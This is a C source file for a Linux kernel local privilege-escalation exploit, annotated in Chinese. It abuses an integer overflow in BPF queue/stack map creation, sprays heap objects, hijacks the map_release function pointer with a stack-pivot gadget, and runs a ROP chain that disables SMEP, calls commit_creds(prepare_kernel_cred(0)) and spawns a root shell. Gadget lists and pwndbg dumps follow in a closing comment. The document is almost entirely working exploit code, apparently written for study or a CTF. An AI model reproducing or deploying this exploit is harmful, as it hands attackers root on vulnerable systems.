//$ gcc -O3 -pthread -static -g -masm=intel ./exp.c -o exp
#define _GNU_SOURCE
#define SPRAY_NUMBER 14

#include <signal.h>
#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#define mov_cr4_rax 0xffffffff810037d5           // 0xffffffff810037d5: mov cr4, rax; push rcx; popfq; ret;
#define pop_rdx_ret 0xffffffff81002dda           // 0xffffffff81002dda: pop rdx; ret;
#define pop_rsi_ret 0xffffffff81001c50           // 0xffffffff81001c50: pop rsi; ret; 
#define PREPARE_KERNEL_CRED 0xFFFFFFFF810E3D40
#define COMMIT_CREDS        0xFFFFFFFF810E3AB0
#define pop_rdi_ret 0xffffffff810013b9           // 0xffffffff810013b9: pop rdi; ret; 
#define pop_rax_ret 0xffffffff81029c71           // 0xffffffff81029c71: pop rax; ret; 
#define push_rax_rsi_ret 0xffffffff81264e0b      // 0xffffffff81264e0b: push rax; push rsi; ret;
#define swapgs_pop_ret 0xffffffff81c00d5a        // 0xffffffff81c00d5a: swapgs; popfq; ret;
#define iretq_ret   0xffffffff81081242           // 0xffffffff81081242: iretq; ret; 
#define xchg_eax_esp_ret 0xffffffff81954dc8      // 0xffffffff81954dc8: xchg eax, esp; ret 0x674;
#define krop_base_to_map         0x81954000
int rop_start = 0x143c;                          // 0xdc8 + 0x674 = 0x143C  rop开始的地址
void* krop_base_mapped;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          );
  puts("[+] satus has been saved.");
}

typedef int __attribute__((regparm(3)))(* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

void get_shell()
{
  //commit_creds(prepare_kernel_cred(0));
  system("id");
  char *shell = "/bin/sh";
  char *args[] = {shell, NULL};
  execve(shell, args, NULL);
}

unsigned long rop_chain[]= {
  0,   // xchg eax, esp; ret 0x674;之后，先执行偏移0处的gadget, 也即执行0x81954dc8地址所放置的gadget  pop_rax_ret
  0x6f0,
  mov_cr4_rax,
  pop_rdi_ret,
  0,
  PREPARE_KERNEL_CRED,
  pop_rsi_ret,
  pop_rdi_ret,
  push_rax_rsi_ret,
  COMMIT_CREDS,
  swapgs_pop_ret,
  0x246,           //
  iretq_ret,
  &get_shell,
  0,   // user_cs
  0,   // user_rflags,
  0,   // krop_base_mapped + 0x4000,  ???
  0    // user_ss
};

void *fake_stack;
void prepare_krop(){
  krop_base_mapped = mmap ((void *)krop_base_to_map, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
  if (krop_base_mapped<0){
    perror("[-] mmap failed");   
  }
  *(unsigned long*)0x81954dc8 = pop_rax_ret;   
  fake_stack = mmap((void *)0xa000000000,0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  memset(fake_stack, '\x00', 0x100);
  *(unsigned long*)(fake_stack+0x10) = xchg_eax_esp_ret;    // 偏移0x10处对应  map_release函数指针
  rop_chain[14]=user_cs;
  rop_chain[15]=user_rflags;
  rop_chain[16]=user_sp;   // 也可以是(unsigned long)(fake_stack+0x6000);
  rop_chain[17]=user_ss;
  memcpy(krop_base_mapped + rop_start, rop_chain, sizeof(rop_chain));
  puts("[+] rop chain has been initialized!");
}

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

long victim[SPRAY_NUMBER];
void spray(){
  for(int i=0; i < SPRAY_NUMBER; i++)
    victim[i] = syscall(__NR_bpf, 0, 0x200011c0, 0x2c);
  return;
}

void get_shell_again(){
  puts("SIGSEGV found");
  puts("Get shell again");
  system("id");
  char *shell = "bin/sh";
  char *args[] = {shell, NULL};
  execve(shell, args, NULL);
}

int main(void)
{
  // Step 1 : 构造添加bpf (BPF_MAP_CREATE) 的参数
  signal(SIGSEGV, get_shell_again);  //  遇到SIGSEGV错误时调用get_shell_again()处理函数（对存储的无效访问：当程序试图在已分配的内存之外读取或写入时）
  syscall(__NR_mmap, 0x20000000,0x1000000,PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);  
  long res = 0;
  memset(0x200011c0, '\x00', 0x30);
  *(uint32_t *)0x200011c0 = 0x17;   // map_type  如何确定??
  *(uint32_t *)0x200011c4 = 0;      // key_size
  *(uint32_t *)0x200011c8 = 0x40;   // value_size 需拷贝的用户字节数
  *(uint32_t *)0x200011cc = -1;     // max_entries = 0xffffffff 构造整数溢出
  *(uint32_t *)0x200011d0 = 0;      // map_flags
  *(uint32_t *)0x200011d4 = -1;     // inner_map_fd
  *(uint32_t *)0x200011d8 =0;       // numa_node

  // Step 2 : 保存用户态变量， xchg地址处布置ROP
  save_status();
  printf("user_cs:%llx    user_ss:%llx    user_rflags:%llx     user_sp:%llx\n",user_cs, user_ss, user_rflags, user_sp);
  prepare_krop();

  // Step 3 : 添加bpf，喷射构造相邻的bpf结构，有利于溢出
  res = syscall(__NR_bpf, 0, 0x200011c0, 0x2c);
  spray();

  // Step 4 : 溢出覆盖bpf_queue_stack中的虚表指针ops，伪造虚表bpf_map_ops中的函数指针map_release
  *(uint32_t*)0x200000c0 = res;         //map_fd    根据BPF_MAP_CREATE返回的编号找到对应的bpf对象
  *(uint64_t*)0x200000c8 = 0;           //key
  *(uint64_t*)0x200000d0 = 0x20000140;  //value  输入的缓冲区
  *(uint64_t*)0x200000d8 = 2;           //flags  = BPF_EXIST =2

  //memset(0x20002000, '\x00', 0x100);
  //*(uint32_t*)(0x20002000+0x10) = xchg_eax_esp_ret;   // 偏移0x10处对应  map_release函数指针
  uint64_t * ptr = (uint64_t*)0x20000140;
  for(int i=0; i<8; i++)
    ptr[i]=i;
  ptr[6]=fake_stack;   //0x20002000  0xa000000000  从偏移0x30才开始覆盖。虚表指针ops在开头，但bpf_queue_stack管理结构大小0xd0，但是申请空间时需0x100对齐，0x100-0xd0=0x30。
  syscall(__NR_bpf,2,0x200000c0,0x20);

  // Step 5 : close()触发map_release()
  for (int i=0; i<SPRAY_NUMBER; i++)
    close(victim[i]);
  return 0;
}
/*
1.Gadget:
0xffffffff81002dda: pop rdx; ret; 
0xffffffff810013b9: pop rdi; ret; 
0xffffffff81029c71: pop rax; ret; 
0xffffffff81c00d5a: swapgs; popfq; ret; 
0xffffffff81081242: iretq; ret; 
0xffffffff81954dc8: xchg eax, esp; ret 0x674;    要选择对齐的xchg,  指令地址和返回偏移都得对齐。
0xffffffff813cc384: xchg eax, esp; ret 0x840;
0xffffffff815bb88a: xchg eax, esp; ret 0x88;
0xffffffff8101275a: xchg eax, esp; ret; 

0xffffffff81001c50: pop rsi; ret; 
0xffffffff82aff99b: mov rdi, rax; call rcx; 
0xffffffff81264e0b: push rax; push rsi; ret;

0xffffffff810037d5: mov cr4, rax; push rcx; popfq; ret;
0xffffffff810aec18: mov cr4, rdi; push rdx; popfq; ret;

2.问题
(1)找到map_type确定方式
(2)找到跳转到map_release时寄存器情况，jmp eax??
/ # cat /proc/kallsyms | grep map_release
ffffffff8119d050 t bpf_map_release
ffffffff811a8b00 t bpffs_map_release
ffffffff81810070 t map_release

pwndbg> x /30i 0xffffffff8119d050
   0xffffffff8119d050:  push   rbx
   0xffffffff8119d051:  mov    rbx,QWORD PTR [rsi+0xc8]
   0xffffffff8119d058:  mov    rax,QWORD PTR [rbx]
   0xffffffff8119d05b:  mov    rax,QWORD PTR [rax+0x10]
   0xffffffff8119d05f:  test   rax,rax
   0xffffffff8119d062:  je     0xffffffff8119d06c
   0xffffffff8119d064:  mov    rdi,rbx
   0xffffffff8119d067:  call   0xffffffff81e057c0
   0xffffffff8119d06c:  mov    rdi,rbx
   0xffffffff8119d06f:  call   0xffffffff8119d010
   0xffffffff8119d074:  xor    eax,eax
   0xffffffff8119d076:  pop    rbx
   0xffffffff8119d077:  ret
.text:FFFFFFFF81E057C0                 jmp     rax


3.找到map_free函数指针偏移
断在溢出点memcpy(0xFFFFFFFF811AEF85)，查看 bpf_queue_stack中ops指针地址   ->   0xffffffff82029ba0
pwndbg> x /20xg 0xffffffff82029ba0                           <-劫持前
0xffffffff82029ba0: 0xffffffff811aedd0  0xffffffff811af0b0
0xffffffff82029bb0: 0x0000000000000000  0xffffffff811af090
0xffffffff82029bc0: 0xffffffff811aee30  0x0000000000000000
0xffffffff82029bd0: 0xffffffff811aee00  0xffffffff811aee10
0xffffffff82029be0: 0xffffffff811aee20  0xffffffff811aef00
0xffffffff82029bf0: 0xffffffff811af080  0xffffffff811af070
pwndbg> x /20xg 0x000000a000000000                           <-劫持后
0xa000000000: 0x0000000000000000  0x0000000000000000
0xa000000010: 0xffffffff81954dc8  0x0000000000000000
0xa000000020: 0x0000000000000000  0x0000000000000000



*/
